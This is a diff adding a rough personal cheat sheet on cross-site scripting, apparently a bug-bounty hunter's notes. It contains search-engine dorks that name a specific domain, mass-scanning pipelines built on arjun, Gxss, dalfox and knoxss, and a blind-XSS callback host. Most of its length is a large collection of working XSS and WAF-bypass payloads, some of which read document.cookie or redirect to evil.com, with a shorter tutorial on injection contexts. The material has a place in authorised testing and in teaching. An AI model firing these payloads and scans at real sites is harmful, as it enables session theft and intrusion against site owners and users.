@@ -1,0 +1,636 @@
+Xss
+====
+
+
+site:*.*.parabol.co inurl:return= | inurl:return_to= | inurl:return_uri= | inurl:redirect= | inurl:redirect_to= | inurl:redirect_to= | inurl:redirect_uri= | inurl:prev= | inurl:prev_page= | inurl:next_page= | inurl:page=   | inurl:site= | inurl:next= | inurl:view= | inurl:back= | inurl:url= | inurl:to= | inurl:dest= | inurl:source= | inurl:from= | inurl:continue= | inurl:continue_to=  | inurl:go= | inurl:return_path= | inurl:checkout_url= | inurl:image= | inurl:http | inurl:image_url= | inurl:cgi_bin= | inurl:out= | inurl:windows= | inurl:show= | inurl:dir= | inurl:navigation= | inurl:file= | inurl:val= | inurl:validate= | inurl:domain= | inurl:feed= | inurl:port= | inurl:data= | inurl:host= | inurl:reference= | inurl:site= | inurl:html= | inurl:callback= 
+
+
+inurl:index.php?id=
+inurl:product.php?id=
+inurl:category.php?id=
+inurl:article.php?id=
+inurl:galllery.php?id=
+inurl:page.php?id=
+inurl:show.php?id=
+inurl:detail.php?id=
+inurl:view.php?id=
+inurl:newsitem.php?num=
+inurl:readnews.php?id=
+inurl:topic.php?id=
+inurl:forum.php?id=
+inurl:profile.php?id
+inurl:showthread.php?t=
+inurl:member.php?action=profile&id=
+inurl:productlist.php?id=
+inurl:shop_category.php?id=
+inurl:catalog.php?cat=
+
+
+"<img/src/onerror=alert(0)"@xss.com   try email fild
+
+
+xss   
+
+
+parameter word list   wget https://raw.githubusercontent.com/Damian89/xssfinder/master/wordlists/params.txt 
+
+
+and 
+
+wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt
+
+
+godfather parameter
+
+
+
+arjun  tool
+
+https://raw.githubusercontent.com/s0md3v/Arjun/master/arjun/db/large.txt   param brutforce wordlist  arjun -u -w
+
+arjun -u https://xya.com/login.jsp -w /home/Rajeev/listparametr.txt
+find msg ,id , dele,
+
+arjun -u https://xya.com/404 -w /home/Rajeev/listparametr.txt
+
+after use https://xya.com/login.jsp?msg=hello
+
+arjun -i livesubdomin.txt 
+arjun -u url
+inurl:kodemint.in ?id=
+
+cat allurl.txt | gf xss | sed 's/=.*/=/' |
+
+
+cat endpoint.txt | grep "=" | kxss
+
+paramspider -l targets.txt 
+
+cat par.txt | kxss 
+
+%27"></a></script></titl></form></span></meta></style></iframe></noscript></textarea></xmp></pre><ScrIPt>prompt`rajeev`;>
+
+"/&nvgt;&nvlt;img src=x OnError="alert(0);&nvgt;
+"><svg/onload=alert(1)>
+javascript://%e2%80%a8alert(document.cookie);
+"/><img>/><svg/onload=alert(1)>
+"></\/\<img>/><svg/onload=alert(1)>
+"></\/\</script><script>alert(1)</script>
+"/><img src=x onerror=alert(0)>
+"><script>alert("xss");</script>
+<div onmouseover="alert('XSS');">Hello :) 
+^ [My favorite one - works like 80% of the time for me].
+</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>
+<a href="j&#97;vascript&#x3A;&#97;lert('Sucuri WAF Bypassed ! ' + document.domain + '\nCookie: ' + document.cookie); window&#46;location&#46;href='https://evil.com';">ClickMe</a>
+
+'"<A Autofocus HRef %252f=""OnFocus=top/**/?.['al'%2B'ert'](0)>
+
+cloud flare bypass
+
+"><Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ=="))>
+OnXSS=<Img/Src/OnError=alert(1)>
+<Img Src=OnXSS OnError=alert(1)>
+"*prompt(document.domain)*"
+<img hrEF="0" sRC="data:0," oNLy=1 oNErrOR​=console.log`1`>
+<00 foo="<a%20href="javascript:alert('XSS-Bypass')">XSS-CLick</00>--%20/
+<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
+"><body/oNpagEshoW=(confirm)(document.domain)>
+<svg onload=alert%26%230000000040"")>
+<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>  
+"&gt;&lt;Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ=="))&gt;
+<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">
+"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
+<svg onload=alert%26%230000000040"1")>
+"><Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ=="))>
+<A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
+'<00 foo="<a%20href="javascript:alert('XSS-Bypass')">XSS-CLick</00>--%20/
+<A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
+<Svg Only=1 OnLoad=confirm(1)>
+<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
+<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
+"><img src=x onerror=alert(1)>
+"><img src=x onerrora=confirm() onerror=confirm(1)>
+onfocus=alert&#x00000000028;1&#x00000000029; autofocus>
+">%20<img src=o onerror=alert``>//
+"><img src=x onerrora=confirm() onerror=confirm(1)>
+<script>alert()</script>
+%2sscript%2ualert()%2s/script%2u
+"&gt;&lt;Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ=="))&gt;
+"><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;
+<h1/%6f%6e/oNclicK=alert`hacked`>CLICK HERE
+`payload´; %3Cimg src='null' onerror=alert('spyerror')%3E 
+"><!'/*"*\'/*\"/*--></Script><Image SrcSet=K */; OnError=confirm(document.domain) //>#
+<a+HREF="%26%237 javascrip%26%239t: alert%261par;document .domain) *> 
+<image/b/src/onerror=globalThis&lsqb;&apos;&#92;u0070rint&apos;&rsqb;&lpar;&rpar;>
+<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
+"><details%20onMouSeover=%0Aabc=(co\u006efirm);abc%28%27xss%27%26%230000000000000000041//>
+<img src=x  oncontentvisibilityautostatechange="confirm(1)">
+<svg on onload=(alert)(document.domain)>
+javascript:var{a:onerror}={a:alert};throw%20document.domain
+<A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>	
+‘>alert(154)</script><script/154=’;;;;;;;
+<Svg%20Only=1%20OnLoad=confirm(atob(%27Q2xvdWRmbGFyZSBieXBhc3NlZA==%27))>
+<svg onload=alert&#0000000040"1")><””>
+<svg%20onx=()%20onload=(confirm)(document.domain)>
+ &#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt;  
+"><track/onerror='confirm`1`'>
+"\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\
+"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
+"><div/onclick="(function(){setTimeout(()%20=>%20alert(document.domain),%200);})();">Click%20me!</div>
+\"><img/src=x/onerro=6><img/src=\"1\"/onerror=alert(1);>
+";eval,'a'%2Balert`2+5`%2B"
+"/hrefd=(1%0a%0aoncontentvisibilityautostatechange=confirm(/A00N/)%0d%0astyle=content-visibility:auto
+<button%20popovertarget=x>Click%20me</button><img%20onbeforetoggle=alert(1)%20popover%20id=x>XSS
+<Svg Only=1 OnLoad=confirm(1)>
+"/><svg/svg/svg/On/OnLoAd/=confirm`1`
+<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
+<svg%0Aonauxclick=0;[1].some(confirm)//
+<Svg%20Only=1%20OnLoad=confirm(atob(%27Q2xvdWRmbGFyZSBieXBhc3NlZA==%27))>
+<svg/OnLoad="`${prompt``}`">
+"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F 
+<svg onload=alert&#0000000040document.cookie)>
+">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(`cloudfrontbypass`)//'>
+&#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt;
+“><svg/on</script>laod=alert>
+<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
+%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
+"><<iframe onx=() onload=(alert)(6)>
+{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
+<select><noembed></select><script x='a@b'a> y='a@b'//a@b%0a\u0061lert('CYBERTIX')</script x>
+
+
+
+&nvgt;   --   >
+
+&nvlt;  ---  <
+
+Find: <s>|</s>
+Replace: [INST]|[/INST]
+
+
+[script]alert`1`|[/script]
+
+> --!
+
+;)&nvlt;/span&nvgt;&nvlt;/h1&nvgt;&nvlt;/div&nvgt;
+                        
+
+
+too use    paramspider arjun
+
+XSS:
+Knoxss mass hunting
+
+
+cat par.txt | Gxss -p Rajeev | dalfox pipe
+
+
+cat allurls.txt | gf xss | sed 's/=.*/=/'| Gxss -p rajeev | dalfox pipe
+
+
+python3 xsstrke.py -u 'https://xy.com/?id='
+
+
+
+file=$1; key="API_KEY"; while read line; do curl https://api.knoxss.pro -d target=$line -H "X-API-KEY: $key" -s | grep PoC; done < $file
+
+cat domains.txt | (gau || hakrawler || waybackurls || katana) | grep -Ev "\.(jpeg|jpg|png|ico|gif|css|woff|svg)$" | uro | grep =  | qsreplace "<img src=x onerror=alert(1)>" | httpx -silent -nc -mc 200 -mr "<img src=x onerror=alert(1)>"
+
+cat targets.txt | (gau || hakrawler || waybackurls || katana) | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe
+
+echo target.com | (gau || hakrawler || waybackurls || katana) | grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
+
+cat urls.txt | grep "=" | sed 's/=.*/=/' | sed 's/URL: //' | tee testxss.txt ; dalfox file testxss.txt -b yours.xss.ht
+
+cat subs.txt | awk '{print $3}'| httpx -silent | xargs -I@ sh -c 'python3 http://xsstrike.py -u @ --crawl'
+
+|grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)"| uro |qsreplace '"><script>alert(1)</script>;>' | freq
+
+|grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)"| uro |qsreplace '"><img src=x onerror=prompt(1);>' | freq
+
+Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into websites. There is 3 types of XSS Attack:
+
+    Reflected XSS
+
+    Attack where the malicious script runs from another website through the web browser
+
+    Stored XSS
+
+    Stored attacks are those where the injected script is permanently stored on the target servers
+
+    DOM-Based XSS
+
+    A type of XSS that has payloads found in the DOM rather than within the HTML code.
+
+Where to find
+
+This vulnerability can appear in all features of the application. If you want to find Dom-based XSS, you can find it by reading the javascript source code.
+How to exploit
+
+    Basic payload
+
+<script>alert(1)</script>
+<svg/onload=alert(1)>
+<img src=x onerror=alert(1)>
+
+    Add ' or " to escape the payload from value of an HTML tag
+
+"><script>alert(1)</script>
+'><script>alert(1)</script> 
+
+    Example source code
+
+<input id="keyword" type="text" name="q" value="REFLECTED_HERE">
+
+    After input the payload
+
+<input id="keyword" type="text" name="q" value=""><script>alert(1)</script>
+
+    Add --> to escape the payload if input lands in HTML comments.
+
+--><script>alert(1)</script>
+
+    Example source code
+
+<!-- REFLECTED_HERE --> 
+
+    After input the payload
+
+<!-- --><script>alert(1)</script> -->
+
+    Add when the input inside or between opening/closing tags, tag can be <a>,<title>,<script> and any other HTML tags
+
+</tag><script>alert(1)</script>
+"></tag><script>alert(1)</script>
+
+    Example source code
+
+<a href="https://bing.com/1?status=REFLECTED_HERE">1</a>
+
+    After input the payload
+
+<a href="https://target.com/1?status="></a><script>alert(1)</script>">1</a>
+
+    Use when input inside an attribute’s value of an HTML tag but > is filtered
+
+" onmouseover=alert(1)
+" autofocus onfocus=alert(1)
+
+    Example source code
+
+<input id="keyword" type="text" name="q" value="REFLECTED_HERE">
+
+    After input the payload
+
+<input id="keyword" type="text" name="q" value="" onmouseover=alert(1)">
+
+    Use </script> when input inside <script> tags
+
+</script><script>alert(1)</script>
+
+    Example source code
+
+<script>
+    var sitekey = 'REFLECTED_HERE';
+</script>
+
+    After input the payload
+
+<script>
+    var sitekey = '</script><script>alert(1)</script>';
+</script>
+
+XSS Cheat Sheet (Advanced)
+
+    Use when input lands in a script block, inside a string delimited value.
+
+'-alert(1)-'
+'/alert(1)//
+
+    Example source code
+
+<script>
+    var sitekey = 'REFLECTED_HERE';
+</script>
+
+    After input the payload
+
+<script>
+    var sitekey = ''-alert(1)-'';
+</script>
+
+    Same like Number 7. But inside a string delimited value but quotes are escaped by a backslash.
+
+\'alert(1)//
+
+    Example source code
+
+<script>
+    var sitekey = 'REFLECTED_HERE';
+</script>
+
+    If we input payload '-alert(1)-' it will be like this
+
+<script>
+    var sitekey = '\'-alert(1)-\'';
+</script>
+
+The quotes are escaped by a backslash so we need to bypass them
+
+    After input the payload
+
+<script>
+    var sitekey = '\\'alert(1)//';
+</script>
+
+    Use when there’s multi reflection in the same line of JS code
+
+/alert(1)//\
+/alert(1)}//\
+
+    Example source code
+
+<script>
+    var a = 'REFLECTED_HERE'; var b = 'REFLECTED_HERE';
+</script>
+
+    After input the payload
+
+<script>
+    var a = '/alert(1)//\'; var b = '/alert(1)//\';
+</script>
+
+    Use when input inside a string delimited value and inside a single logical block like function or conditional (if, else, etc).
+
+'}alert(1);{'
+\'}alert(1);{// 
+
+    Example source code
+
+<script>
+    var greeting;
+    var time = 1;
+    if (time < 10) {
+    test = 'REFLECTED_HERE';
+  }
+</script>
+
+    After input the payload
+
+<script>
+    var test;
+    var time = 1;
+    if (time < 10) {
+    test = ''}alert(1);{'';
+  }
+</script>
+
+    Payload number 2 uses when quote escaped by backslash
+
+    Use when input lands inside backticks delimited strings
+
+${alert(1)}
+
+    Example source code
+
+<script>
+    var dapos = `REFLECTED_HERE`;
+</script>
+
+    After input the payload
+
+<script>
+    var dapos = `${alert(1)}`;
+</script>
+
+    Uses when there is multiple reflections on same page. (Double Reflection)
+
+'onload=alert(1)><svg/1='
+'>alert(1)</script><script/1='
+*/alert(1)</script><script>/*
+
+    After input the payload
+
+<!DOCTYPE html>
+<html>
+<body>
+'onload=alert(1)><svg/1='
+...
+'onload=alert(1)><svg/1='
+</body>
+</html>
+
+    Uses when there is multiple reflections on same page. (Triple Reflection)
+
+*/alert(1)">'onload="/*<svg/1='
+`-alert(1)">'onload="`<svg/1='
+*/</script>'>alert(1)/*<script/1='
+
+    After input the payload
+
+<!DOCTYPE html>
+<html>
+<body>
+*/alert(1)">'onload="/*<svg/1='
+...
+*/alert(1)">'onload="/*<svg/1='
+...
+*/alert(1)">'onload="/*<svg/1='
+</body>
+</html>
+
+    XSS in filename (File Upload) Use when uploaded filename is reflected somewhere in target page
+
+"><svg onload=alert(1)>.jpeg
+
+    XSS in metadata (File Upload) Use when uploaded metada is reflected somewhere in target page (using exiftool)
+
+$ exiftool -Artist='"><script>alert(1)</script>' dapos.jpeg
+
+    XSS with SVG file (File Upload)
+
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
+
+    XSS via markdown
+
+[Click Me](javascript:alert('1'))
+
+    XSS in XML page
+
+<a:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</a:script>
+
+    Add a "-->" to payload if input lands in a comment section
+
+    Add a "]]>" if input lands in a CDATA section
+
+XSS Cheat Sheet (Bypass)
+
+    Mixed Case
+
+<Script>alert(document.cookie)</Script> 
+
+    Unclosed Tags
+
+<svg onload="alert(1)"
+
+    Uppercase Payloads
+
+<SVG ONLOAD=ALERT(1)>
+
+    Encoded XSS
+
+(Encoded)
+%3Csvg%20onload%3Dalert(1)%3E 
+
+(Double Encoded)
+%253Csvg%2520onload%253Dalert%281%29%253E 
+
+(Triple Encoded)
+%25253Csvg%252520onload%25253Dalert%25281%2529%25253E 
+
+    JS Lowercased Input
+
+<SCRİPT>alert(1)</SCRİPT>
+
+    PHP Email Validation Bypass
+
+<svg/onload=alert(1)>"@gmail.com
+
+    PHP URL Validation Bypass
+
+javascript://%250Aalert(1)
+
+    Inside Comments Bypass
+
+<!--><svg onload=alert(1)-->
+
+Bypass WAF
+
+    Cloudflare
+
+<svg%0Aonauxclick=0;[1].some(confirm)//
+
+<svg/onload={alert`1`}>
+
+<a/href=j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(1)&rpar;>
+
+"><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;
+
+"><onx=[] onmouseover=prompt(1)>
+
+%2sscript%2ualert()%2s/script%2u
+
+"Onx=() onMouSeoVer=prompt(1)>"Onx=[] onMouSeoVer=prompt(1)>"/*/Onx=""//onfocus=prompt(1)>"//Onx=""/*/%01onfocus=prompt(1)>"%01onClick=prompt(1)>"%2501onclick=prompt(1)>"onClick="(prompt)(1)"Onclick="(prompt(1))"OnCliCk="(prompt`1`)"Onclick="([1].map(confirm))
+
+[1].map(confirm)'ale'+'rt'()a&Tab;l&Tab;e&Tab;r&Tab;t(1)prompt&lpar;1&rpar;prompt&#40;1&#41;prompt%26%2300000000000000000040;1%26%2300000000000000000041;(prompt())(prompt``)
+
+<svg onload=alert%26%230000000040"1")>
+
+<svg onload=prompt%26%230000000040document.domain)>
+
+<svg onload=prompt%26%23x000000028;document.domain)>
+
+<svg/onrandom=random onload=confirm(1)>
+
+<video onnull=null onmouseover=confirm(1)>
+
+<a id=x tabindex=1 onbeforedeactivate=print(`XSS`)></a><input autofocus>
+
+<img ignored=() src=x onerror=prompt(1)>
+
+<svg onx=() onload=(confirm)(1)>
+
+<--`<img/src=` onerror=confirm``> --!>
+
+<img src=x onerror="a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}};self[Object.keys(self)[a()]](document.domain)">
+
+<j id=x style="-webkit-user-modify:read-write" onfocus={window.onerror=eval}throw/0/+name>H</j>#x
+
+'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
+
+'"><img/src/onerror=.1|alert``>
+
+:javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
+
+Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();
+
+    Cloudfront
+
+">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(`cloudfrontbypass`)//'>
+
+<--`<img%2fsrc%3d` onerror%3dalert(document.domain)> --!>
+
+"><--<img+src= "><svg/onload+alert(document.domain)>> --!>
+
+    Cloudbric
+
+<a69/onclick=[1].findIndex(alert)>pew
+
+    Comodo WAF
+
+<input/oninput='new Function`confir\u006d\`0\``'>
+
+<p/ondragstart=%27confirm(0)%27.replace(/.+/,eval)%20draggable=True>dragme
+
+    ModSecurity
+
+<a href="jav%0Dascript&colon;alert(1)">
+
+    Imperva
+
+<input id='a'value='global'><input id='b'value='E'><input 'id='c'value='val'><input id='d'value='aler'><input id='e'value='t(documen'><input id='f'value='t.domain)'><svg+onload[\r\n]=$[a.value+b.value+c.value](d.value+e.value+f.value)>
+
+<x/onclick=globalThis&lsqb;'\u0070r\u006f'+'mpt']&lt;)>clickme
+
+<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click
+
+<a69/onclick=write&lpar;&rpar;>pew
+
+<details/ontoggle="self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];"/open>
+
+<svg onload\r\n=$.globalEval("al"+"ert()");>
+
+<svg/onload=self[`aler`%2b`t`]`1`>
+
+%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%2523x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%2526%2523x29%3B%22%3E
+
+<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
+
+<img/src=q onerror='new Function`al\ert\`1\``'>
+
+<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
+
+    AWS
+
+<script>eval(atob(decodeURIComponent(confirm`1`)))</script>
+
+If you want to see the other payload for other WAF, check this link
+References
+
+    Brute Logic
+    Awesome-WAF
+    Some random twitter posts
+
+
+
+
+==
+
+manually xss ashar javed 
+
+
+five coman contexts 
+
+Html       <body>  is html   <title>bablu kumar </title>
+
+Script    <scrip> bablu  </scrip>
+
+attribute  value=  , q=   is atribute
+
+style    <div style="balu">click </div>
+
+url   <a href="bablu">click</a>  <iframe src="bablu">click</iframe>   url is 
+
+
+
+<script> var a= "inject point>;</script>
